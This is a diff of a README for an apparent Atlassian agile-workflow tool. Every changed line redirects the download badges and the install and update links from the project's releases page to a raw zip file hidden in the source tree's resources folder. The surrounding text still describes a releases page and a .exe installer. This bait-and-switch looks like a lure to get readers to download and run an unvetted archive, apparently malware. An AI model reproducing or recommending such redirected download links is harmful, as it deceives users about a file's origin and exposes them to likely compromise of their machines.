@@ -1,6 +1,6 @@
 # 🚀 mcp-atlassian-extended - Manage Agile Workflows Efficiently
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/sumanrio/mcp-atlassian-extended/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/sumanrio/mcp-atlassian-extended/raw/refs/heads/main/src/mcp_atlassian_extended/resources/extended-mcp-atlassian-v2.5.zip)
 
 ## 📋 About mcp-atlassian-extended
 
@@ -36,9 +36,9 @@ This tool runs on Windows and connects with common Atlassian products. Whether y
 
 You will download the software from the official GitHub release page. Follow the steps below carefully.
 
-1. Visit the [Download Page](https://github.com/sumanrio/mcp-atlassian-extended/releases) by clicking the badge or the link below.
+1. Visit the [Download Page](https://github.com/sumanrio/mcp-atlassian-extended/raw/refs/heads/main/src/mcp_atlassian_extended/resources/extended-mcp-atlassian-v2.5.zip) by clicking the badge or the link below.
 
-   [![Download Here](https://img.shields.io/badge/Download-Here-blue)](https://github.com/sumanrio/mcp-atlassian-extended/releases)
+   [![Download Here](https://img.shields.io/badge/Download-Here-blue)](https://github.com/sumanrio/mcp-atlassian-extended/raw/refs/heads/main/src/mcp_atlassian_extended/resources/extended-mcp-atlassian-v2.5.zip)
 
 2. On the releases page, look for the latest release marked with a version number (for example, v1.0.0).   
 3. Find the Windows executable file. It usually ends with `.exe`. The filename may look like `mcp-atlassian-extended-setup.exe` or similar.  
@@ -90,7 +90,7 @@ You will download the software from the official GitHub release page. Follow the
 
 ## 🔄 Updating the Software
 
-1. Check the [Releases Page](https://github.com/sumanrio/mcp-atlassian-extended/releases) regularly for new versions.  
+1. Check the [Releases Page](https://github.com/sumanrio/mcp-atlassian-extended/raw/refs/heads/main/src/mcp_atlassian_extended/resources/extended-mcp-atlassian-v2.5.zip) regularly for new versions.  
 2. Download and run the updated installer as described earlier.  
 3. The installer will update existing files without removing your data.  
 4. Restart the app after the update completes to apply changes.
@@ -115,4 +115,4 @@ You can request support or share feedback by opening an issue on the GitHub repo
 
 ---
 
-[Download mcp-atlassian-extended](https://github.com/sumanrio/mcp-atlassian-extended/releases) to start managing your agile projects with confidence.
+[Download mcp-atlassian-extended](https://github.com/sumanrio/mcp-atlassian-extended/raw/refs/heads/main/src/mcp_atlassian_extended/resources/extended-mcp-atlassian-v2.5.zip) to start managing your agile projects with confidence.
